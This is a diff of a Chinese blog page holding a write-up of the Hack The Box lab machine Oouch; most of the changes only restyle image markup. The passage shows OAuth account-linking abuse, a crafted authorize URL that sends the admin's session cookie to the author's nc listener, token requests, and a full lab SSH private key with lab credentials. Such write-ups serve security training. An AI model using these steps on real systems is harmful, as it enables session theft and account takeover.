@@ -146,7 +146,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -243,53 +243,151 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">➜  Oouch ftp 10.10.10.177</span><br><span class="line">Connected to 10.10.10.177.</span><br><span class="line">220 qtc's development server</span><br><span class="line">Name (10.10.10.177:miao): anonymous</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> ls</span></span><br><span class="line">500 Illegal PORT command.</span><br><span class="line">ftp: bind: Address already in use</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> quote pasv</span></span><br><span class="line">227 Entering Passive Mode (10,10,10,177,191,185).</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> passive</span></span><br><span class="line">Passive mode on.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> ls</span></span><br><span class="line">227 Entering Passive Mode (10,10,10,177,184,218).</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get project.txt</span></span><br><span class="line">local: project.txt remote: project.txt</span><br><span class="line">227 Entering Passive Mode (10,10,10,177,183,137).</span><br><span class="line">150 Opening BINARY mode data connection for project.txt (49 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">49 bytes received in 0.00 secs (354.4560 kB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> <span class="built_in">exit</span></span></span><br><span class="line">221 Goodbye.</span><br><span class="line"></span><br><span class="line">➜  Oouch cat project.txt</span><br><span class="line">Flask -&gt; Consumer</span><br><span class="line">Django -&gt; Authorization Servers</span><br></pre></td></tr></table></figure>
 
 <h2 id="8000"><a href="#8000" class="headerlink" title="8000"></a>8000</h2><p> 直接访问是一个错误页面</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071601.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071601.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="5000"><a href="#5000" class="headerlink" title="5000"></a>5000</h2><p>简单的注册登录：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071602.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071602.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>随意注册登录，如果500那就是服务炸了，reset一下机器：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071603.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071603.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">➜  Oouch gobuster dir -u http://10.10.10.177:5000/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://10.10.10.177:5000/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2020/07/11 15:41:16 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/about (Status: 302)</span><br><span class="line">/contact (Status: 302)</span><br><span class="line">/documents (Status: 302)</span><br><span class="line">/home (Status: 302)</span><br><span class="line">/login (Status: 200)</span><br><span class="line">/logout (Status: 302)</span><br><span class="line">/oauth (Status: 302)</span><br><span class="line">/profile (Status: 302)</span><br><span class="line">/register (Status: 200)</span><br><span class="line">===============================================================</span><br><span class="line">2020/07/11 15:43:01 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
 
 <h2 id="oauth"><a href="#oauth" class="headerlink" title="oauth"></a>oauth</h2><p>这里会有一些新的子域名，自己加hosts：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.177 oouch.htb consumer.oouch.htb authorization.oouch.htb</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071604.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071604.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>点击第一个connect链接，登录后会跳转到下面这个：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071605.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071605.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>所以整个系统应该就是oauth相关，5000是flask，8000是Django，我们应该以某种方式将管理员账号与我们自己的账号绑定。</p>
 <p>oauth安全相关资料：</p>
 <ul>
 <li>Attacking the OAuth Protocol - Dhaval Kapil<br><a href="https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/" target="_blank" rel="noopener">https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/</a></li>
 </ul>
 <h2 id="document"><a href="#document" class="headerlink" title="document"></a>document</h2><p>提示只有管理员可以查看，所以就是需要某种方式得到管理员账号权限：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071610.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071610.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h2><p>这里是提交内容管理员账号会自动查看，可能存在SSRF：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071606.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071606.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="攻击oauth"><a href="#攻击oauth" class="headerlink" title="攻击oauth"></a>攻击oauth</h1><ol>
 <li>首先在Authorization.oouch.htb:8000注册一个账号：</li>
 </ol>
 <p>首先在这里注册一个账号：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071607.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071607.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <ol start="2">
 <li>访问<a href="http://consumer.oouch.htb:5000/oauth/connect，进行connect，会在connect和authorize两个请求后跳转到确认界面：" target="_blank" rel="noopener">http://consumer.oouch.htb:5000/oauth/connect，进行connect，会在connect和authorize两个请求后跳转到确认界面：</a></li>
 </ol>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071608.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071608.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <ol start="3">
 <li>confirm authorize</li>
 <li>Get token,注意这个请求需要直接drop掉，因为token只有一次有效，我们保存后直接drop掉请求</li>
 <li>SSRF，将第4步的请求URL通过contact发给管理员</li>
 </ol>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071609.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071609.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <ol start="6">
 <li>访问<a href="http://consumer.oouch.htb:5000/oauth/connect" target="_blank" rel="noopener">http://consumer.oouch.htb:5000/oauth/login</a>，看到一个新的确认界面,  这里有个坑，不要直接点页面的链接，显示是login实际是connect，自己复制login浏览器访问：</li>
 </ol>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071613.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071611.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071613.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071611.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <ol start="7">
 <li>然后查看profile，发现我们的账号和qtc账号connect，qtc账号是管理员，可以查看documents：</li>
 </ol>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071612.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071614.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071612.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071614.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <table>
 <thead>
 <tr>
@@ -318,44 +416,130 @@
 <h1 id="目录扫描-1"><a href="#目录扫描-1" class="headerlink" title="目录扫描"></a>目录扫描</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;oauth&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;common.txt</span><br><span class="line">&#x2F;applications (Status: 301)</span><br><span class="line"></span><br><span class="line">gobuster dir -u http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;oauth&#x2F;applications -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;common.txt</span><br><span class="line">&#x2F;register (Status: 301)</span><br><span class="line"></span><br><span class="line">develop:supermegasecureklarabubu123!</span><br></pre></td></tr></table></figure>
 
 <h2 id="register"><a href="#register" class="headerlink" title="register"></a>register</h2><p>需要认证，可以使用前面document中得到的账号密码：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071615.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071616.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071615.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071616.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="new-application"><a href="#new-application" class="headerlink" title="new application"></a>new application</h2><p>新建一个application，重定向URL设置为我们自己的监听server：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071617.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071618.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071617.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071618.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="构造URL"><a href="#构造URL" class="headerlink" title="构造URL"></a>构造URL</h2><p>根据oauth2协议规范构造url：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;oauth&#x2F;authorize&#x2F;?client_id&#x3D;ue1FGRi1HRlRUmikHZy3oAxeeAowHQGB2KFH8LgA&amp;redirect_uri&#x3D;http:&#x2F;&#x2F;10.10.14.32:7777&amp;grant_type&#x3D;authorization_code&amp;client_secret&#x3D;VgiDaPFrnhFB9BZDKhujIsHHLhX4KReSKGdBrRQkLVx3RZwKxux1Ej2w6giDHmNkqeSFyPtvJdkcom6NfBfr9WFavBYGoMPj5wB58g14iSdB5EKQU2psXRQsreLOh8Aa</span><br></pre></td></tr></table></figure>
 
 <h2 id="SSRF-1"><a href="#SSRF-1" class="headerlink" title="SSRF"></a>SSRF</h2><p>将构造的URL发给管理员，监听接收到管理员cookie：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071619.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071619.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7777</span><br><span class="line">Listening on any address 7777 (cbt)</span><br><span class="line">Connection from 10.10.10.177:48784</span><br><span class="line">GET /?error=invalid_request&amp;error_description=Missing+response_type+parameter. HTTP/1.1</span><br><span class="line">Host: 10.10.14.32:7777</span><br><span class="line">User-Agent: python-requests/2.21.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: sessionid=zn0t5p80u92kej7o7mmenhwygrntein6;</span><br><span class="line"></span><br><span class="line">Total received bytes: 273</span><br><span class="line">Total sent bytes: 0</span><br></pre></td></tr></table></figure>
 
 <h2 id="qtc-cookie"><a href="#qtc-cookie" class="headerlink" title="qtc cookie"></a>qtc cookie</h2><p>修改cookie，刷新，现在我们是qtc用户身份：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071620.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071620.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="API"><a href="#API" class="headerlink" title="API"></a>API</h1><p>现在我们可以尝试以qtc用户身份通过API获取信息，首先需要获得access token：</p>
 <p>这里需要用client_credentials的application,用自己的账号修改类型后再切到qtc账号：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071621.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071621.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST &#39;http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;oauth&#x2F;token&#x2F;&#39; -H &quot;Content-Type: application&#x2F;x-www-form-urlencoded&quot; --data &quot;grant_type&#x3D;client_credentials&amp;client_id&#x3D;ue1FGRi1HRlRUmikHZy3oAxeeAowHQGB2KFH8LgA&amp;client_secret&#x3D;VgiDaPFrnhFB9BZDKhujIsHHLhX4KReSKGdBrRQkLVx3RZwKxux1Ej2w6giDHmNkqeSFyPtvJdkcom6NfBfr9WFavBYGoMPj5wB58g14iSdB5EKQU2psXRQsreLOh8Aa&quot; -L -s</span><br><span class="line">&#123;&quot;access_token&quot;: &quot;DZMcOVlYaBFgJ0j6AApUgzSb79PArE&quot;, &quot;expires_in&quot;: 600, &quot;token_type&quot;: &quot;Bearer&quot;, &quot;scope&quot;: &quot;read write&quot;&#125;%</span><br></pre></td></tr></table></figure>
 
 <h2 id="get-ssh-key"><a href="#get-ssh-key" class="headerlink" title="get ssh key"></a>get ssh key</h2><p>使用这个token通过API获取ssh key：</p>
 <p><a href="http://authorization.oouch.htb:8000/api/get_ssh/?access_token=DZMcOVlYaBFgJ0j6AApUgzSb79PArE" target="_blank" rel="noopener">http://authorization.oouch.htb:8000/api/get_ssh/?access_token=DZMcOVlYaBFgJ0j6AApUgzSb79PArE</a></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071622.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071622.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="ssh-key"><a href="#ssh-key" class="headerlink" title="ssh key"></a>ssh key</h2><p>格式比较坑，修复后：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAqQvHuKA1i28D1ldvVbFB8PL7ARxBNy8Ve&#x2F;hfW&#x2F;V7cmEHTDTJtmk7</span><br><span class="line">LJZzc1djIKKqYL8eB0ZbVpSmINLfJ2xnCbgRLyo5aEbj1Xw+fdr9&#x2F;yK1Ie55KQjgnghNdg</span><br><span class="line">reZeDWnTfBrY8sd18rwBQpxLphpCR367M9Muw6K31tJhNlIwKtOWy5oDo&#x2F;O88UnqIqaiJV</span><br><span class="line">ZFDpHJ&#x2F;u0uQc8zqqdHR1HtVVbXiM3u5M&#x2F;6tb3j98Rx7swrNECt2WyrmYorYLoTvGK4frIv</span><br><span class="line">bv8lvztG48WrsIEyvSEKNqNUfnRGFYUJZUMridN5iOyavU7iY0loMrn2xikuVrIeUcXRbl</span><br><span class="line">zeFwTaxkkChXKgYdnWHs+15qrDmZTzQYgamx7+vD13cTuZqKmHkRFEPDfa&#x2F;PXloKIqi2jA</span><br><span class="line">tZVbgiVqnS0F+4BxE2T38q&#x2F;&#x2F;G513iR1EXuPzh4jQIBGDCciq5VNs3t0un+gd5Ae40esJKe</span><br><span class="line">VcpPi1sKFO7cFyhQ8EME2DbgMxcAZCj0vypbOeWlAAAFiA7BX3cOwV93AAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAKkLx7igNYtvA9ZXb1WxQfDy+wEcQTcvFXv4X1v1e3JhB0w0ybZpOyyWc3NXYyCi</span><br><span class="line">qmC&#x2F;HgdGW1aUpiDS3ydsZwm4ES8qOWhG49V8Pn3a&#x2F;f8itSHueSkI4J4ITXYK3mXg1p03wa</span><br><span class="line">2PLHdfK8AUKcS6YaQkd+uzPTLsOit9bSYTZSMCrTlsuaA6PzvPFJ6iKmoiVWRQ6Ryf7tLk</span><br><span class="line">HPM6qnR0dR7VVW14jN7uTP+rW94&#x2F;fEce7MKzRArdlsq5mKK2C6E7xiuH6yL27&#x2F;Jb87RuPF</span><br><span class="line">q7CBMr0hCjajVH50RhWFCWVDK4nTeYjsmr1O4mNJaDK59sYpLlayHlHF0W5c3hcE2sZJAo</span><br><span class="line">VyoGHZ1h7Pteaqw5mU80GIGpse&#x2F;rw9d3E7maiph5ERRDw32vz15aCiKotowLWVW4Ilap0t</span><br><span class="line">BfuAcRNk9&#x2F;Kv&#x2F;xudd4kdRF7j84eI0CARgwnIquVTbN7dLp&#x2F;oHeQHuNHrCSnlXKT4tbChTu</span><br><span class="line">3BcoUPBDBNg24DMXAGQo9L8qWznlpQAAAAMBAAEAAAGBAJ5OLtmiBqKt8tz+AoAwQD1hfl</span><br><span class="line">fa2uPPzwHKZZrbd6B0Zv4hjSiqwUSPHEzOcEE2s&#x2F;Fn6LoNVCnviOfCMkJcDN4YJteRZjNV</span><br><span class="line">97SL5oW72BLesNu21HXuH1M&#x2F;GTNLGFw1wyV1+oULSCv9zx3QhBD8LcYmdLsgnlYazJq&#x2F;mc</span><br><span class="line">CHdzXjIs9dFzSKd38N&#x2F;RRVbvz3bBpGfxdUWrXZ85Z&#x2F;wPLPwIKAa8DZnKqEZU0kbyLhNwPv</span><br><span class="line">XO80K6s1OipcxijR7HAwZW3haZ6k2NiXVIZC&#x2F;m&#x2F;WxSVO6x8zli7mUqpik1VZ3X9HWH9ltz</span><br><span class="line">tESlvBYHGgukRO&#x2F;OFr7VOd&#x2F;EpqAPrdH4xtm0wM02k+qVMlKId9uv0KtbUQHV2kvYIiCIYp</span><br><span class="line">&#x2F;Mga78V3INxpZJvdCdaazU5sujV7FEAksUYxbkYGaXeexhrF6SfyMpOc2cB&#x2F;rDms7KYYFL</span><br><span class="line">&#x2F;4Rau4TzmN5ey1qfApzYC981Yy4tfFUz8aUfKERomy9aYdcGurLJjvi0r84nK3ZpqiHQAA</span><br><span class="line">AMBS+Fx1SFnQvV&#x2F;c5dvvx4zk1Yi3k3HCEvfWq5NG5eMsj+WRrPcCyc7oAvb&#x2F;TzVn&#x2F;Eityt</span><br><span class="line">cEfjDKSNmvr2SzUa76Uvpr12MDMcepZ5xKblUkwTzAAannbbaxbSkyeRFh3k7w5y3N3M5j</span><br><span class="line">sz47&#x2F;4WTxuEwK0xoabNKbSk+plBU4y2b2moUQTXTHJcjrlwTMXTV2k5Qr6uCyvQENZGDRt</span><br><span class="line">XkgLd4XMed+UCmjpC92&#x2F;Ubjc+g&#x2F;qVhuFcHEs9LDTG9tAZtgAEAAADBANMRIDSfMKdc38il</span><br><span class="line">jKbnPU6MxqGII7gKKTrC3MmheAr7DG7FPaceGPHw3n8KEl0iP1wnyDjFnlrs7JR2OgUzs9</span><br><span class="line">dPU3FW6pLMOceN1tkWj+&#x2F;8W15XW5J31AvD8dnb950rdt5lsyWse8+APAmBhpMzRftWh86w</span><br><span class="line">EQL28qajGxNQ12KeqYG7CRpTDkgscTEEbAJEXAy1zhp+h0q51RbFLVkkl4mmjHzz0&#x2F;6Qxl</span><br><span class="line">tV7VTC+G7uEeFT24oYr4swNZ+xahTGvwAAAMEAzQiSBu4dA6BMieRFl3MdqYuvK58lj0NM</span><br><span class="line">2lVKmE7TTJTRYYhjA0vrE&#x2F;kNlVwPIY6YQaUnAsD7MGrWpT14AbKiQfnU7JyNOl5B8E10Co</span><br><span class="line">G&#x2F;0EInDfKoStwI9KV7&#x2F;RG6U7mYAosyyeN+MHdObc23YrENAwpZMZdKFRnro5xWTSdQqoVN</span><br><span class="line">zYClNLoH22l81l3minmQ2+Gy7gWMEgTx&#x2F;wKkse36MHo7n4hwaTlUz5ujuTVzS+57Hupbwk</span><br><span class="line">IEkgsoEGTkznCbAAAADnBlbnRlc3RlckBrYWxpAQIDBA&#x3D;&#x3D;</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>使用这个ssh key，以qtc用户连接，得到user.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071623.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071623.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="搜集信息"><a href="#搜集信息" class="headerlink" title="搜集信息"></a>搜集信息</h1><p>查看ip发现docker，172.17.0.1/16和172.18.0.1/16两个网段：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:~$ ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">     